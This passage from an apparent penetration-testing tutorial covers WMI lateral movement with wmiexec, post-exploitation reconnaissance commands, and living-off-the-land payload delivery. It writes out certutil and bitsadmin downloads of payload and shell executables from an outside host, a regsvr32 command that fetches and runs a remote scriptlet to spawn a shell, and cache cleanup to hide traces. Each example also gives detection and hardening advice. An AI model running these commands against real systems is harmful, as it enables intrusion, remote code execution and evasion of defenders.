# => Hash-based authentication works for WMI as well as SMB

# Step 5 — Nooutput flag (useful for stealth — no SMB share created)
python3 wmiexec.py Administrator:'P@ssword123!'@192.0.2.84 -nooutput "cmd.exe /c whoami > C:\\Temp\\out.txt"
# => Command runs via WMI without output retrieval
# => No temporary SMB share created — lower forensic footprint
# => Read output file on target in next command
```

**Key Takeaway:** WMI lateral movement creates no service installation event (Event ID 7045) making it harder to detect than psexec. Defenders need WMI-specific monitoring through Sysmon event ID 20 (WMI event consumer) and process creation events from WMI provider host (WmiPrvSE.exe).

**Why It Matters:** WMI is a legitimate Windows management protocol, making its abuse blend into normal administrative traffic. wmiexec is preferred by attackers when SMB service creation monitoring is in place. Defenders should restrict WMI access using firewall rules (block TCP 135 and WMI dynamic ports between workstations), monitor for WmiPrvSE.exe spawning unusual child processes (cmd.exe, powershell.exe), and use Windows DCOM authentication hardening to limit who can make remote WMI calls.

---

## Example 56: Post-Exploitation Situational Awareness — whoami, net user, ipconfig, route

**What this covers:** Immediately after gaining access to a new host, structured situational awareness gathering identifies the current privilege level, network position, other connected users, and onward pivot opportunities. A consistent checklist ensures nothing is missed before taking noisy further actions.

**Scenario:** Authorized pentest; initial shell obtained on lab Windows host `workstation02` (192.0.2.85); first actions after landing.

```cmd
:: Step 1 — Identity and privileges
whoami
:: => lab\jdoe  (domain user context)

whoami /groups
:: => GROUP INFORMATION
:: => Group Name               Type             Attributes
:: => ======================== ================ ==================================
:: => LAB\Domain Users         Group            Mandatory group
:: => LAB\IT_Admins            Group            Mandatory group  ← Interesting group!
:: => BUILTIN\Administrators   Alias            Enabled  ← Local admin rights!

whoami /priv
:: => Privilege Name              State
:: => ========================== ========
:: => SeShutdownPrivilege        Disabled
:: => SeDebugPrivilege           Enabled  ← Can read LSASS memory (run Mimikatz)
:: => SeImpersonatePrivilege     Enabled  ← Potato attack vector if needed

:: Step 2 — Network configuration and position
ipconfig /all
:: => Ethernet adapter Ethernet0:
:: =>    IPv4 Address: 192.0.2.85
:: =>    Default Gateway: 192.0.2.1
:: => Ethernet adapter Ethernet1:
:: =>    IPv4 Address: 203.0.113.85  ← Second NIC on different subnet!
:: =>    Default Gateway: 203.0.113.1

route print
:: => Active Routes:
:: =>   0.0.0.0          0.0.0.0      192.0.2.1   192.0.2.85
:: =>   203.0.113.0  255.255.255.0         On-link   203.0.113.85
:: =>   10.x.0.0    255.0.0.0         203.0.113.1   203.0.113.85  ← Route to internal 10.x
:: => Routing table reveals additional network 203.0.113.0/24 accessible

:: Step 3 — Active sessions (other users on this host)
net user /domain
:: => User accounts for \\lab.example
:: => Administrator  jdoe  sqlservice  websvc  backup_svc

query user
:: => USERNAME    SESSIONNAME  ID  STATE   LOGON TIME
:: => jdoe        console       1  Active  5/21/2026 8:05:00 AM
:: => Administrator              2  Disc    5/21/2026 7:30:00 AM  ← Disconnected session!
:: => Administrator has a disconnected session — may have credentials in LSASS

:: Step 4 — Installed software and running services
net start
:: => Running services: wuauserv, MSSQLServer, Schedule, ...
:: => MSSQLServer running — database access potentially available
```

**Key Takeaway:** Systematic situational awareness before taking any further action prevents mistakes and reveals the highest-value next steps — elevated privileges, dual-homed networks, and other user sessions guide the entire subsequent attack chain.

**Why It Matters:** Rushed post-exploitation without proper situational awareness leads to missed opportunities and noisy mistakes. Professional pentesters follow a consistent checklist to map the attack surface before acting. Defenders monitoring for these reconnaissance commands in sequence (whoami → whoami /priv → ipconfig → route → net user) can build detection rules for post-exploitation activity using Windows Event Log process creation (4688) or Sysmon event ID 1.

---

## Example 57: Living Off the Land — certutil, bitsadmin, and regsvr32 for Payload Delivery

**What this covers:** Living-off-the-land (LOtL) techniques use built-in Windows binaries (LOLBins) for malicious purposes including file download, payload execution, and code running, avoiding the need to upload attacker tools. certutil, bitsadmin, and regsvr32 are classic LOLBins present on virtually all Windows versions.

**Scenario:** Authorized pentest; limited shell on lab Windows 10 host at 192.0.2.86; need to download and execute a payload without uploading non-system tools.

```cmd
:: --- certutil: file download and base64 decode ---

:: Step 1 — Download a file using certutil (HTTPS-capable)
certutil -urlcache -split -f http://192.0.2.200:8080/payload.exe C:\Temp\payload.exe
:: => -urlcache pulls from URL cache (actually downloads the file)
:: => -split splits large files; -f forces download even if cached
:: => CertUtil: -URLCache command completed successfully.
:: => payload.exe downloaded to C:\Temp\

:: Step 2 — Decode a base64-encoded payload (bypasses network filtering)
:: (Attacker first encodes payload: base64 -w 0 payload.exe > payload.b64)
certutil -decode C:\Temp\payload.b64 C:\Temp\payload.exe
:: => Input Length = 341248
:: => Output Length = 255936
:: => CertUtil: -decode command completed successfully.
:: => Binary decoded from base64 — avoids transferring raw EXE

:: --- bitsadmin: background download via BITS service ---

:: Step 3 — Download using BITS (Background Intelligent Transfer Service)
bitsadmin /transfer myJob /download /priority normal http://192.0.2.200:8080/shell.exe C:\Temp\shell.exe
:: => bitsadmin uses the BITS service (already running) for the transfer
:: => Appears as a legitimate Windows background job in BITS logs
:: => Job: myJob, Type: DOWNLOAD, State: TRANSFERRED
:: => C:\Temp\shell.exe downloaded via BITS

:: --- regsvr32: scriptlet execution (bypasses AppLocker) ---

:: Step 4 — Execute a COM scriptlet remotely with regsvr32 (Squiblydoo)
regsvr32 /s /n /u /i:http://192.0.2.200:8080/shell.sct scrobj.dll
:: => regsvr32 — built-in COM registration utility
:: => /s silent, /n no DllRegisterServer, /u unregister, /i: specifies script URL
:: => scrobj.dll — Script Component Runtime, processes .sct files
:: => Fetches and executes the remote SCT COM scriptlet
:: => No file written to disk — pure network execution
:: => Spawns a shell as the current user

:: Step 5 — Verify execution and clean up certutil cache
certutil -urlcache -split -f http://192.0.2.200:8080/ delete
:: => Clears the URL cache entry to reduce forensic artifacts
:: => CertUtil: -URLCache command completed successfully.
```

**Key Takeaway:** LOLBins bypass allowlisting and tool-upload detection because they are trusted, signed Windows binaries. Defenders cannot simply block these tools without breaking OS functionality — detection must focus on behavioral anomalies in their usage context.

**Why It Matters:** Living-off-the-land is the dominant technique in modern red team operations and APT campaigns because it defeats signature-based AV and tool-upload detection. certutil downloading EXEs, bitsadmin creating unusual jobs, and regsvr32 contacting external URLs are all well-documented IOCs. Defenders should deploy Sysmon with rules for certutil/bitsadmin/regsvr32 network connections (event IDs 3 and 22), alert on regsvr32 spawning child processes, restrict BITS job creation via Group Policy, and use Microsoft Defender for Endpoint's Attack Surface Reduction rules targeting LOLBin abuse.
